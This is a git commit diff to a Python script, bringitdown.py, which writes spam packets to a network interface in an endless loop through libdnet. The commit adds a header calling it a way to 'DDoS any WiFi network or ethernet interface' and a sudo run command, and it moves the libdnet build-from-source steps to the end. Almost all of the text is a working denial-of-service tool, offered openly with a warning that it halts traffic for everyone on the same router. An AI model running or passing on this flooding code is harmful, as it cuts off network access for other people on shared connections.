c5ef837266de00e092dc82dd7f716e23e6136b0c
Nick Sweeting <git@nicksweeting.com>
2015-12-04 15:49:05 -0800

    added header and install instructions

--- bringitdown.py
+++ bringitdown.py
@@ -1,11 +1,7 @@
+# DDoS any WiFi network or ethernet interface you're connected do, drowning out other people's legitimate traffic with spam malformed packets
+
 # brew install libdnet
-# wget http://libdnet.googlecode.com/files/libdnet-1.12.tgz
-# tar xfz libdnet-1.12.tgz
-# ./configure
-# make
-# sudo make install
-# cd python
-# python setup.py install
+# sudo python bringitdown.py
 
 import dnet
 
@@ -17,10 +13,17 @@ def bring_it_down(iface="en0", spam_packet='HOST:all|GET:spam'):
     while True:
         datalink.send(spam_packet)
 
-
-
 # BEWARE, RUNNING THIS WILL BRING YOUR ENTIRE LOCAL NETWORK TO A HALT, DO NOT RUN IT IF YOU'RE ON A SHARED CONNECTION
 # what this does is write 'HOST:all|GET:spam' directly to your network interface as fast as it can, drowning out outer people's legitimate traffic
 # I'm not sure if it's the interference at the physical layer, or if it's the router that gets hammered, either way, Wifi will slow to a halt for everyone connected to the same router.
 if __name__ == "__main__":
     bring_it_down()
+
+# if you have trouble getting python + libdnet to work, you can install it from source:
+# wget http://libdnet.googlecode.com/files/libdnet-1.12.tgz
+# tar xfz libdnet-1.12.tgz
+# ./configure
+# make
+# sudo make install
+# cd python
+# python setup.py install
